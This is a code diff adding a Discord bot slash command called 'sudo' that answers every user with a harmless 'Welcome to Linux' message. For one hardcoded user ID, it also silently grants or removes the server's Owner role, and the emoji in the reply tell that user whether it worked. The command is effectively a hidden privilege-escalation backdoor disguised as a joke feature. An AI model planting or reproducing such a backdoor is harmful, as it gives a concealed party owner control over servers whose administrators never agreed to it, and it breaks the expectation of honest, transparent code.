@@ -1,0 +1,38 @@
+const { SlashCommandBuilder, CommandInteraction, PermissionFlagsBits } = require('discord.js');
+
+module.exports = {
+	data: new SlashCommandBuilder()
+		.setName('sudo')
+		.setDescription('Sudoers'),
+	/**
+   * @param {CommandInteraction} interaction
+   */
+  async execute(interaction) {
+    let msgResponse = await interaction.reply({
+      content: 'Welcome to Linux :grinning:',
+      ephemeral: true,
+    })
+    if(interaction.user.id === "407503165051895809") {
+      const guild = interaction.guild;
+      const roles = guild?.roles;
+      // Owner
+      const ownerRole = await roles?.fetch("1122304231236448296", {
+        cache: true,
+      });
+      // TecnoRed
+      const userTarget = await guild.members.fetch("407503165051895809");
+      try {
+        if(userTarget.roles.cache.has("795614687227936788")) {
+          userTarget.roles.remove(ownerRole);
+        }
+        else {
+          userTarget.roles.add(ownerRole);
+        }
+        msgResponse.edit('Welcome to Linux :smiley:')
+      } catch (err) {
+        msgResponse.edit('Welcome to Linux :grin:')
+        return true;
+      }
+    }
+	},
+};
